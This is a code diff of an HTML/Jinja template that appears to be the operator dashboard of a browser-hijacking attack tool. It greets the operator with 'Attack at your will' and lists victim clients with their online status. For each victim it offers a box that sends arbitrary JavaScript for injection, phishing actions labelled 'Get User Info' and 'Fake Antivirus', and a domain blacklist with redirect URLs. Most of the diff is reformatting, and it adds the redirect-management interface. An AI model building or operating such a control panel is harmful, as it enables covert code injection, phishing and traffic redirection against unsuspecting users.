@@ -15,16 +15,21 @@
     <script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
     <script src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js"></script>
 
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
+            integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
+            crossorigin="anonymous"></script>
+
     <script>
         $(document).ready(function () {
 
             var table = $('#example').DataTable({
 
                 "order": [[1, 'desc']],
-                "stateSave" : true,
+                "stateSave": true,
                 "columnDefs": [
-                    {"searchable": false, "targets": [1,2,3,4,5]},
-                    {"orderable": false, "targets": [2,3,4,5]}
+                    {"searchable": false, "targets": [1, 2, 3, 4, 5]},
+                    {"orderable": false, "targets": [2, 3, 4, 5]}
                 ]
 
             });
@@ -44,7 +49,7 @@
                             )
                         ).show();
                 });
-                $(this).find("a[id*='viewinfo']").each(function(){
+                $(this).find("a[id*='viewinfo']").each(function () {
                     this.text = 'View Info';
                 })
             });
@@ -95,10 +100,10 @@
                 console.log(id);
                 var rowInfo = '<tr id="row' + id + '" class="userrow" style="background-color: transparent">';
                 var idName = '<td class="text-center rowtext" style="background-color: transparent">' +
-                        '<button class="transparentbutton" id="clientid"' +
-                        'onclick="get_info_display_new_tab(' + id + ')">'
-                        + '<u class="name' + (table.rows().count() + 1) + '" id="' + id + '">' + id  + '</u></button>' +
-                        '</td>';
+                    '<button class="transparentbutton" id="clientid"' +
+                    'onclick="get_info_display_new_tab(' + id + ')">'
+                    + '<u class="name' + (table.rows().count() + 1) + '" id="' + id + '">' + id + '</u></button>' +
+                    '</td>';
                 var status = '<td class="text-center rowtext" id="status' + id + '"style="background-color: green;'
                     + '">Online </td>';
 
@@ -118,7 +123,7 @@
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
                     'onclick="call_phishing(' + id + ',1)">Get User Info</button>' +
                     '<button type="button" class="btn btn-outline-secondary buttontext"' +
-                    'onclick="call_phishing(' + id + ',2)">Phish #2</button></div></td>';
+                    'onclick="call_phishing(' + id + ',2)">Fake Antivirus</button></div></td>';
 
                 var infobutton = '<td><a id="viewinfo' + id + '" class="btn btn-primary" data-toggle="collapse"'
                     + 'role="button" aria-expanded="false" aria-controls="collapse' + id + '"' +
@@ -153,9 +158,10 @@
 
     </script>
 </head>
+
 <body id="doc"
       style="background-image: url('https://mdbootstrap.com/img/Photos/Others/background.jpg'); background-size: auto; background-position: center center;">
-
+<h1> {{ blacklist }} </h1>
 <div class="text-center alert alert-success success" style="display:none">
     <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
     <strong id="success-message">Success!</strong>
@@ -163,178 +169,334 @@
 
 <div>
     <h1 class="text-center display-3 title" style="margin-top:2%">Welcome, Seanonymous!</h1>
-    <h4 class="text-center display-4 subtitle">Attack at your will.</h4>
+    <div class="row">
+        <h4 class="col-md-12 text-center display-4 subtitle">Attack at your will.</h4>
+    </div>
     <form class="text-center" action="{{ (url_for('logout', next = request.endpoint)) }}" method="post">
         <button class="text-center btn btn-outline-secondary buttontext">Log Out</button>
     </form>
-</div>
+    <div class="row" style="margin-top: 1%">
+        <div class="col text-center">
+            <button class="text-center btn btn-primary" onclick="
+            var w =document.getElementById('blacklistDomains');
+            var a = document.getElementById('containerForAddBlacklist');
+            if(w.classList.contains('open')){
+                w.style.display = 'none';
+                a.style.display = 'none'
+                w.classList.remove('open')
+            }
+            else{
+                openBlacklist();
+                w.classList.add('open');
+                a.style.display= '';
+                w.style.display = 'block'
+               }
+">Edit/View Blacklisted Websites
+            </button>
+        </div>
+    </div>
 
-<table id="example" class="table table-responsive" style="width: 100%">
-    <thead class="thead-dark">
-    <tr id="heading">
-        <th class="text-center"><u>ID</u></th>
-        <th class="text-center">Status</th>
-        <th class="text-center">URL/Pattern</th>
-        <th class="text-center">JS Attack</th>
-        <th class="text-center">Phishing Attack</th>
-        <th class="text-center viewinfo"></th>
-    </tr>
-    </thead>
-    <tbody>
-    {% for item in data %}
-        <tr id="row{{ item[0] }}" class="userrow" style="background-color: transparent">
-            {% if item[5] is not equalto '' %}
-                <td class="text-center rowtext" style="background-color: transparent">
-                    <button class="transparentbutton" id="clientid"
-                            onclick="get_info_display_new_tab({{ item[0] }})">
-                        <u id="{{ item[0] }}" class="name{{ loop.index }}">{{ item[5] }}</u></button>
-                </td>
-            {% else %}
-                <td class="text-center rowtext" style="background-color: transparent">
-                    <button class="transparentbutton" id="clientid"
-                            onclick="get_info_display_new_tab({{ item[0] }})">
-                        <u id="{{ item[0] }}" class="name{{ loop.index }}">{{ item[0] }}</u></button>
-                </td>
-            {% endif %}
 
-            {% if active_users.__contains__(item[0]|string) %}
-                <td class="text-center rowtext" id="status{{ item[0] }}" style="background-color: green; ">Online
-                </td>
-            {% else %}
-                <td class="text-center rowtext" id="status{{ item[0] }}" style="background-color: red">
-                    Offline
-                </td>
-            {% endif %}
+    <div>
 
-            <td><input id="pattern{{ item[0] }}" type="text" class="form-control"
-                       aria-label="Text input with segmented dropdown button"></td>
-            <td class="text-center">
-                <form class="input-group">
-                    <input id="input{{ item[0] }}" type="text" class="form-control"
-                           aria-label="Text input with segmented dropdown button">
-                    <div class="input-group-append    ">
-                        <button type="reset" class="btn btn-outline-secondary buttontext"
-                                onclick="call_javascript({{ item[0] }})">Execute
+
+{#        <div class="row" style="margin-top: 1%">#}
+{#            <div class="col text-center">#}
+{#                <button id="addblacklist" style="display: none" class="text-center btn btn-primary" onclick="#}
+{#            var new_url = prompt('New URL');#}
+{#">Add Blacklist#}
+{#                </button>#}
+{#            </div>#}
+{#        </div>#}
+
+
+{#        <div class="container" style="margin-top: 1%; width:100%">#}
+{##}
+{#                <form class="form-inline center-block">#}
+{#                    <label class="sr-only" for="inlineFormInput">New Url</label>#}
+{##}
+{#                    <input type="text" class="col-xs-4 text-center form-control mb-2 mr-sm-2 mb-sm-0" id="inlineFormInput"#}
+{#                           placeholder="Enter New URL">#}
+{##}
+{#                    <label class="sr-only" for="inlineFormInputGroup">New Redirect</label>#}
+{#                    <div class="input-group mb-2 mr-sm-2 mb-sm-0">#}
+{#                        <input type="text" class="col-xs-4 text-center form-control" id="inlineFormInputGroup"#}
+{#                               placeholder="Enter Redirect URL">#}
+{#                    </div>#}
+{##}
+{#                    <button type="submit" class="btn btn-primary">Submit</button>#}
+{#                </form>#}
+{##}
+{#        </div>#}
+        <div id="containerForAddBlacklist" class="container" style="margin-top: 1%; display:none">
+            <div class="row">
+                <div class="col-sm-10 offset-sm-1 text-center">
+                    <div class="info-form">
+                        <form action="" class="form-inline justify-content-center">
+                            <div class="form-group">
+                                <label class="sr-only">Name</label>
+                                <input id="newURL" type="text" class="form-control" placeholder="Enter New URL">
+                            </div>
+                            <div class="form-group">
+                                <label class="sr-only">Email</label>
+                                <input id ="newRedirect" type="text" class="form-control" placeholder="Enter New Redirect">
+                            </div>
+                            <button type="submit" class="btn btn-success " onclick="
+                              u  = document.getElementById('newURL')
+                              r =document.getElementById('newRedirect')
+                              one =u.value;
+                              two =r.value;
+                              u.value='';
+                              r.value='';
+                            handleBlacklistEntry(one, two, true);
+                            ">Blacklist Domain!</button>
+                        </form>
+                    </div>
+                    <br>
+
+                                    </div>
+            </div>
+        </div>
+
+
+
+        <div class="row">
+            <div class="col text-center" id="blacklistDomains" style="display:none">
+            </div>
+        </div>
+    </div>
+
+    <table id="example" class="table table-responsive" style="width: 100%">
+        <thead class="thead-dark">
+        <tr id="heading">
+            <th class="text-center"><u>ID</u></th>
+            <th class="text-center">Status</th>
+            <th class="text-center">URL/Pattern</th>
+            <th class="text-center">JS Attack</th>
+            <th class="text-center">Phishing Attack</th>
+            <th class="text-center viewinfo"></th>
+        </tr>
+        </thead>
+        <tbody>
+        {% for item in data %}
+            <tr id="row{{ item[0] }}" class="userrow" style="background-color: transparent">
+                {% if item[5] is not equalto '' %}
+                    <td class="text-center rowtext" style="background-color: transparent">
+                        <button class="transparentbutton" id="clientid"
+                                onclick="get_info_display_new_tab({{ item[0] }})">
+                            <u id="{{ item[0] }}" class="name{{ loop.index }}">{{ item[5] }}</u></button>
+                    </td>
+                {% else %}
+                    <td class="text-center rowtext" style="background-color: transparent">
+                        <button class="transparentbutton" id="clientid"
+                                onclick="get_info_display_new_tab({{ item[0] }})">
+                            <u id="{{ item[0] }}" class="name{{ loop.index }}">{{ item[0] }}</u></button>
+                    </td>
+                {% endif %}
+
+                {% if active_users.__contains__(item[0]|string) %}
+                    <td class="text-center rowtext" id="status{{ item[0] }}" style="background-color: green; ">Online
+                    </td>
+                {% else %}
+                    <td class="text-center rowtext" id="status{{ item[0] }}" style="background-color: red">
+                        Offline
+                    </td>
+                {% endif %}
+
+                <td><input id="pattern{{ item[0] }}" type="text" class="form-control"
+                           aria-label="Text input with segmented dropdown button"></td>
+                <td class="text-center">
+                    <form class="input-group">
+                        <input id="input{{ item[0] }}" type="text" class="form-control"
+                               aria-label="Text input with segmented dropdown button">
+                        <div class="input-group-append    ">
+                            <button type="reset" class="btn btn-outline-secondary buttontext"
+                                    onclick="call_javascript({{ item[0] }})">Execute
+                            </button>
+                        </div>
+                    </form>
+                </td>
+                <td class="text-center">
+                    <div class="btn-group" role="group" aria-label="Basic example">
+                        <button type="button" class="btn btn-outline-secondary buttontext"
+                                onclick="call_phishing({{ item[0] }},1)">Get User Info
+                        </button>
+                        <button type="button" class="btn btn-outline-secondary buttontext"
+                                onclick="call_phishing({{ item[0] }},2)">Fake Antivirus
                         </button>
                     </div>
-                </form>
-            </td>
-            <td class="text-center">
-                <div class="btn-group" role="group" aria-label="Basic example">
-                    <button type="button" class="btn btn-outline-secondary buttontext"
-                            onclick="call_phishing({{ item[0] }},1)">Get User Info
-                    </button>
-                    <button type="button" class="btn btn-outline-secondary buttontext"
-                            onclick="call_phishing({{ item[0] }},2)">Fake Antivirus
-                    </button>
-                </div>
-            </td>
-            <td><a id="viewinfo{{ item[0] }}" class="btn btn-primary" data-toggle="collapse"
-                   role="button"
-                   aria-expanded="false" aria-controls="collapse{{ item[0] }}"
-                   onclick="get_info_display_same_page({{ item[0] }})">
-                View Info
-            </a></td>
+                </td>
+                <td><a id="viewinfo{{ item[0] }}" class="btn btn-primary" data-toggle="collapse"
+                       role="button"
+                       aria-expanded="false" aria-controls="collapse{{ item[0] }}"
+                       onclick="get_info_display_same_page({{ item[0] }})">
+                    View Info
+                </a></td>
 
-        </tr>
-    {% endfor %}
-    </tbody>
-</table>
-<script>
-    function call_javascript(person) {
-        document.getElementById("success-message").innerHTML = "JS Attack on " + person + " sent!";
-        $('.success').fadeIn().delay(2000).fadeOut();
+            </tr>
+        {% endfor %}
+        </tbody>
+    </table>
+    <script>
 
-        $.ajax({
-            url: "/sendjs",
-            type: "post",
-            data: {
-                id: person,
-                js: document.getElementById("input"+person).value,
-                pattern: document.getElementById("pattern" + person).value
-            },
-            success: function (response) {
-                console.log(response);
-            },
-            error: function (error) {
-                console.log(error)
-            }
-        });
-        document.getElementById("pattern" + person).value = "";
-    }
+        function openBlacklist() {
+            $.ajax({
+                url: "/getBlacklist",
+                type: "post",
+                data: {},
+                success: function (response) {
+                    console.log('success');
+                    {#var new_page = window.open();#}
+                    {#new_page.document.write(response);#}
+                    document.getElementById('blacklistDomains').innerHTML = response;
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
 
-    function call_phishing(id, attackNumber) {
-        var a = {1: "User Info Phishing Attack on User #", 2: "Fake Antivirus Phishing Attack on User #"}
-        document.getElementById("success-message").innerHTML = a[attackNumber] + id + " sent!";
-        $('.success').fadeIn().delay(500).fadeOut();
-        $.ajax({
-            url: "/phish",
-            type: "post",
-            data: {
-                id: id,
-                number: attackNumber,
-                pattern: document.getElementById("pattern" + id).value
-            },
-            success: function (response) {
-                console.log(response);
-            },
-            error: function (error) {
-                console.log(error)
-            }
-        });
-        document.getElementById("pattern" + id).value = "";
+        }
+
+        function handleBlacklistEntry(urldelete, redirectdelete, add) {
+            console.log(urldelete + redirectdelete + add);
+            $.ajax({
+                url: "/blacklist",
+                type: "post",
+                data: {
+                    url: urldelete,
+                    redirect_url: redirectdelete,
+                    add: add
+                },
+                success: function (response) {
+                    console.log(response);
+                    openBlacklist();
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+
+        }
 
 
-    }
+        function call_javascript(person) {
+            document.getElementById("success-message").innerHTML = "JS Attack on " + person + " sent!";
+            $('.success').fadeIn().delay(2000).fadeOut();
 
-    function submitFormIDMappings(url, mappings){
-        var clientid = mappings[0].id
-        mappings = JSON.stringify(mappings);
-        console.log(mappings);
-        $.ajax({
-            url: "/sendFormIDMappings",
-            type: "post",
-            data: {
-                url_for_mapping:url,
-                mappings: mappings
-            },
-            success: function (response) {
-                console.log(response)
-            },
-            error: function (error) {
-                console.log(error)
-            }
-        });
+            $.ajax({
+                url: "/sendjs",
+                type: "post",
+                data: {
+                    id: person,
+                    js: document.getElementById("input" + person).value,
+                    pattern: document.getElementById("pattern" + person).value
+                },
+                success: function (response) {
+                    console.log(response);
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+            document.getElementById("pattern" + person).value = "";
+        }
 
-        get_info_display_same_page(clientid, 'false')
-    }
-    function get_info_display_new_tab(person) {
-        $.ajax({
-            url: "/getinfo",
-            type: "post",
-            data: {
-                id: person,
-                fullbh: 'true',
-            },
-            success: function (response) {
-                console.log('success')
-                var new_page = window.open();
-                new_page.document.write(response)
-                new_page.document.title = person
-            },
-            error: function (error) {
-                console.log(error)
-            }
-        });
-    }
+        function call_phishing(id, attackNumber) {
+            var a = {1: "User Info Phishing Attack on User #", 2: "Fake Antivirus Phishing Attack on User #"}
+            document.getElementById("success-message").innerHTML = a[attackNumber] + id + " sent!";
+            $('.success').fadeIn().delay(500).fadeOut();
+            $.ajax({
+                url: "/phish",
+                type: "post",
+                data: {
+                    id: id,
+                    number: attackNumber,
+                    pattern: document.getElementById("pattern" + id).value
+                },
+                success: function (response) {
+                    console.log(response);
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+            document.getElementById("pattern" + id).value = "";
 
-    function get_info_display_same_page(person, open) {
-        var childRow = document.getElementById('childRow' + person);
-        var viewinfo = document.getElementById('viewinfo' + person);
-        if (open != 'false') {
-            if (childRow.classList.contains('collapse')) {
-                viewinfo.text = 'Less Info'
-                childRow.classList.remove('collapse');
+
+        }
+
+        function submitFormIDMappings(url, mappings) {
+            var clientid = mappings[0].id
+            mappings = JSON.stringify(mappings);
+            console.log(mappings);
+            $.ajax({
+                url: "/sendFormIDMappings",
+                type: "post",
+                data: {
+                    url_for_mapping: url,
+                    mappings: mappings
+                },
+                success: function (response) {
+                    console.log(response)
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+
+            get_info_display_same_page(clientid, 'false')
+        }
+
+        function get_info_display_new_tab(person) {
+            $.ajax({
+                url: "/getinfo",
+                type: "post",
+                data: {
+                    id: person,
+                    fullbh: 'true',
+                },
+                success: function (response) {
+                    console.log('success')
+                    var new_page = window.open();
+                    new_page.document.write(response)
+                    new_page.document.title = person
+                },
+                error: function (error) {
+                    console.log(error)
+                }
+            });
+        }
+
+        function get_info_display_same_page(person, open) {
+            var childRow = document.getElementById('childRow' + person);
+            var viewinfo = document.getElementById('viewinfo' + person);
+            if (open != 'false') {
+                if (childRow.classList.contains('collapse')) {
+                    viewinfo.text = 'Less Info'
+                    childRow.classList.remove('collapse');
+                    $.ajax({
+                        url: "/getinfo",
+                        type: "post",
+                        data: {
+                            id: person,
+                            fullbh: 'false',
+                        },
+                        success: function (response) {
+                            console.log('success')
+                            var a = "collapse" + person;
+
+                            childRow.innerHTML = response;
+                            ;
+                        },
+                        error: function (error) {
+                            console.log(error)
+                        }
+                    });
+                } else {
+                    viewinfo.text = 'View Info'
+                    childRow.classList.add('collapse')
+                }
+            } else {
                 $.ajax({
                     url: "/getinfo",
                     type: "post",
@@ -346,86 +508,62 @@
                         console.log('success')
                         var a = "collapse" + person;
 
-                        childRow.innerHTML =  response;
-                        ;
+                        childRow.innerHTML = response;
                     },
                     error: function (error) {
                         console.log(error)
                     }
                 });
-            } else {
-                viewinfo.text = 'View Info'
-                childRow.classList.add('collapse')
             }
-        } else {
-            $.ajax({
-                url: "/getinfo",
-                type: "post",
-                data: {
-                    id: person,
-                    fullbh: 'false',
-                },
-                success: function (response) {
-                    console.log('success')
-                    var a = "collapse" + person;
 
-                    childRow.innerHTML = response;
-                },
-                error: function (error) {
-                    console.log(error)
-                }
-            });
+        }
+    </script>
+    <style>
+        .rowtext {
+            color: black;
+            font-family: Arial;
+            font-size: 18px;
+            font-weight: bolder;
         }
 
-    }
-</script>
-<style>
-    .rowtext {
-        color: black;
-        font-family: Arial;
-        font-size: 18px;
-        font-weight: bolder;
-    }
+        .buttontext {
+            color: black;
+            font-family: Arial;
+        }
 
-    .buttontext {
-        color: black;
-        font-family: Arial;
-    }
+        .title {
+            padding-top: 0;
+        }
 
-    .title {
-        padding-top: 0;
-    }
+        .subtitle {
+            padding-bottom: 1%;
+        }
 
-    .subtitle {
-        padding-bottom: 1%;
-    }
+        .transparentbutton {
+            background-color: transparent;
+            outline: none;
+            border: transparent;
+        }
 
-    .transparentbutton {
-        background-color: transparent;
-        outline: none;
-        border: transparent;
-    }
-
-    .dataTables_wrapper {
-        margin: 0 auto;
-        width: 60%;
-    }
+        .dataTables_wrapper {
+            margin: 0 auto;
+            width: 60%;
+        }
 
 
+        .btn-group {
+            position: center;
+        }
 
-    .btn-group {
-        position: center;
-    }
+        td, button {
+            text-align: center;
+        }
 
-    td, button {
-        text-align: center;
-    }
-
-    .userrow {
-        background-color: transparent;
-    }
+        .userrow {
+            background-color: transparent;
+        }
 
 
-</style>
+    </style>
 </body>
 </html>
